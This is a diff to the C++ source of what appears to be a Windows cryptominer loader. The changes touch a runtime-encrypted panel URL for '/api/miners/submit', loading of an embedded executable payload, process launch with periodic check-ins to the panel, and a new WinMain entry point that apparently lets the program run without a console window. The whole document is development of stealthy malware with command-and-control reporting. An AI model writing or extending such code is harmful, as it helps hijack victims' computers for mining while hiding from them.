@@ -93,12 +93,7 @@ int main(int argc, char *argv[])
     }
 #endif
 
-    // Decrypt panel URL(s) at runtime
-#ifdef _DEBUG
-    std::cout << "[DEBUG] Encrypted placeholder value: " << __ENCRYPTED_0__ << std::endl;
-#endif
-    
-    std::string panelUrlsStr = ENCRYPT_STR("http://192.168.1.81:8080/api/miners/submit");
+    std::string panelUrlsStr = ENCRYPT_STR("http://127.0.0.1:8080/api/miners/submit");
     
 #ifdef _DEBUG
     std::cout << "[DEBUG] Decrypted URL(s): " << panelUrlsStr << std::endl;
@@ -149,7 +144,14 @@ int main(int argc, char *argv[])
 
     size_t payloadSize = 0;
     BYTE *payladBuf = nullptr;
-    LoadEmbeddedExe(payladBuf, payloadSize);
+    
+    try {
+        LoadEmbeddedExe(payladBuf, payloadSize);
+    } catch (const std::exception& e) {
+        std::cerr << "[-] Failed to load embedded exe: " << e.what() << std::endl;
+        return -1;
+    }
+    
     if (payladBuf == NULL)
     {
         std::cerr << "Cannot read payload!" << std::endl;
@@ -204,7 +206,6 @@ int main(int argc, char *argv[])
                   << "Main thread ID: " << pi->dwThreadId << "\n";
 #endif
     }
-
     int checkInCounter = 0;
     const int CHECK_IN_INTERVAL = 1; // seconds
 
@@ -331,3 +332,29 @@ int main(int argc, char *argv[])
 
     return 0;
 }
+
+// WinMain entry point for GUI subsystem (WIN32 flag)
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Convert Windows command line to argc/argv format and call main()
+    int argc = 0;
+    LPWSTR* argv_w = CommandLineToArgvW(GetCommandLineW(), &argc);
+    
+    char** argv = new char*[argc];
+    for (int i = 0; i < argc; i++) {
+        int size = WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, NULL, 0, NULL, NULL);
+        argv[i] = new char[size];
+        WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, argv[i], size, NULL, NULL);
+    }
+    
+    int result = main(argc, argv);
+    
+    // Cleanup
+    for (int i = 0; i < argc; i++) {
+        delete[] argv[i];
+    }
+    delete[] argv;
+    LocalFree(argv_w);
+    
+    return result;
+}
+
